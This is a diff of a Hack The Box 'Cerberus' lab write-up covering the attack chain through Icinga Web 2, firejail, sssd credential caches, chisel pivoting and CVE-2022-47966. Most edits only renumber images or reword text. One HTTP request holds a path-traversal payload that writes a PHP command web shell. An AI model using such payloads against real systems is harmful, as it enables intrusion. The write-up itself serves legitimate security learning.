@@ -158,7 +158,7 @@ With these credentials, we can login to the Icinga Web instance!
 
 I looked around, and determined that this was running **Icinga Web 2 Version 2.9.2**, which could be useful later. On the original page that gave us the directory traversal exploit, there was another RCE exploit, but I'm not sure how to exploit it yet.
 
-<figure><img src="../../.gitbook/assets/image (2) (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 I also found that as `matthew`, we could create new users. Reading the code from the Sonar website, we can see that there's a `/$configDir/ssh/matthew` directory that can store a private key.
 
@@ -205,8 +205,6 @@ Connection: close
 Referer: http://icinga.cerberus.local:8080/icingaweb2/config/resource
 Cookie: Icingaweb2=tbt6c7vhlitggtddqjs9911s4v; icingaweb2-session=1679242760; icingaweb2-tzo=-14400-1
 
-
-
 type=ssh&name=notakey&user=.../../../../../../../dev/shm/shell.php&private_key=file:///etc/icingaweb2/ssh/test\x00<?php+system($_REQUEST['cmd']);?>&formUID=form_config_resource&CSRFToken=287102571%7Cfe7a12539b6a50fd04400ed33c28c9cd4db0ae08f0d2333067009010bd9c1861&btn_submit=Save+Changes
 ```
 {% endcode %}
@@ -231,7 +229,7 @@ The MySQL database has nothing of interest. Port 80 was hosting nothing as well.
 
 For SUID binaries, there were two that I didn't usually see:
 
-<figure><img src="../../.gitbook/assets/image (7) (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 We can check its version:
 
@@ -254,7 +252,7 @@ You can now run 'firejail --join=1407' in another terminal to obtain a shell whe
 
 We have to repeat the RCE exploit that we did previously to make this work. Then, we can run the command and be able to become root. **Take note we can just run `su -` for this to work.**
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 Great! Now we have access as root on the Linux docker.&#x20;
 
@@ -300,7 +298,7 @@ We must remember that this machine is joined via to a domain somehow. I googled 
 
 So `sssd` is a method of which Linux machines can store credentials. This is in-line with a certain `createdump` file I found in `/opt/microsoft/powershell/7`, which was a binary with some Red Hat data.
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 We can enumerate the `/var/lib/sss` directory to see if we can find anything useful. There's a `db` folder:
 
@@ -318,11 +316,11 @@ drwxr-xr-x 10 root root    4096 Jan 22 18:12 ..
 
 When `strings` is used to view the `cache_cerberus.local.ldb` file, we can find a hashed password for `matthew`.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 This hash can be cracked instantly:
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 ### Pivoting
 
@@ -371,7 +369,7 @@ chisel server -p 9001 --reverse
 
 Then we can `evil-winrm` in.
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 We can now capture the user flag!
 
@@ -447,7 +445,7 @@ Let's try port forwarding to view the services running on these ports. We would 
 
 We need to add `DC.cerberus.local` with the IP of `172.16.22.1` to our `/etc/hosts` file before we can visit this in Firefox with proxychains. When visiting port 8888, we get redirected to the AD login page. Very similar to NUS's, interestingly.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 We can login with `matthew@cerberus.local` and the password we found earlier. This does nothing for us, however. All it does is provide a URL with a token appended at the back:&#x20;
 
@@ -459,11 +457,11 @@ Not sure what to do with this though.
 
 ### CVE-2022-47966
 
-One thing I've learnt with the newer HTB machines is that **they always use newer exploits available**. As such, we can try to find a new exploit and try it:
+One thing I've learnt with the newer HTB machines is that **they always use newer exploits available**. As such, we can try to find a new exploit for this software and try it:
 
 {% embed url="https://www.cvedetails.com/vulnerability-list/vendor_id-9841/product_id-20523/Zohocorp-Manageengine-Adselfservice-Plus.html" %}
 
-The first was CVE-2022-47966, which was an Exec Code exploit. It seems to affect a huge number of versions, so let's just try this one. This particular exploit requires SAML SSO to be enabled, and it is on this website. The following link is visited when we first load the page before logging in
+The first was CVE-2022-47966, which was an Exec Code exploit. It seems to affect a huge number of versions, so it might work. This particular exploit requires SAML SSO to be enabled, and it is on this website. The following link is visited when we first load the page before logging in
 
 {% code overflow="wrap" %}
 ```
@@ -493,3 +491,11 @@ When executed, we would get a meterpreter shell as the SYSTEM user.
 <figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Using hints from the forum were really helpful, because I dislike using Metasploit and would have naturally avoided it.
+
+## Beyond Root
+
+I feel that I should delve into a bit on how the exploit works since Metasploit is a black box after all. So this exploit only affects websites with SAML installed. This vulnerability arises from an outdated dependency on Apache Santuario, which it self is vulnerable to RCE dating back to 2008.
+
+I would try to explain the exploit, but the report itself does a way better job than I ever can. Check it out!
+
+{% embed url="https://blog.viettelcybersecurity.com/saml-show-stopper/" %}
